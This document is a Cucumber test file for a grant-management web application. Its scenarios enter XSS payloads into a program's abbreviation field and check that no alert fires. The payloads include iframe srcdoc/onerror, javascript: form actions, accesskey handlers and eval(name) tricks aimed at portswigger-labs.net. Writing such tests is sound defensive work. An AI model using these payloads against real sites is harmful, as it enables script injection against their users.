  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                         | Field                |
      | <embed code=https://portswigger-labs.net width=500 height=500 type=text/html> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301053 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                           | Field                |
      | <object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301058 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                            | Field                |
      | <object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301060 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                             | Field                |
      | <object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301061 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                           | Field                |
      | <object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301063 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                           | Field                |
      | <object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301064 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                          | Field                |
      | <a href="%0aalert(1)" onclick="protocol='javascript'">test</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
     # | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM   | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301068 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                          | Field                |
      | <a href="%0aalert(1)" onclick="protocol='javascript'">test</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301069 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                         | Field                |
      | <iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301070 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                      | Field                |
      | <form action="javascript:alert(1)"><input type=submit id=x></form><label for=x>XSS</label> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301071 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                      | Field                |
      | <input type="hidden" accesskey="X" onclick="alert(1)"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X) | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301072 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                         | Field                |
      | <link rel="canonical" accesskey="X" onclick="alert(1)" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X) | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301073 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                       | Field                |
      | <a href=# download="filename.html">Test</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301075 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                           | Field                |
      | <img referrerpolicy="no-referrer" src="//portswigger-labs.net"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301079 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                | Field                |
      | <a href=# onclick="window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301089 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                        | Field                |
      | <iframe name="alert(1)" src="https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></iframe> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301095 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                           | Field                |
      | <base target="alert(1)"><a href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in base tag</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
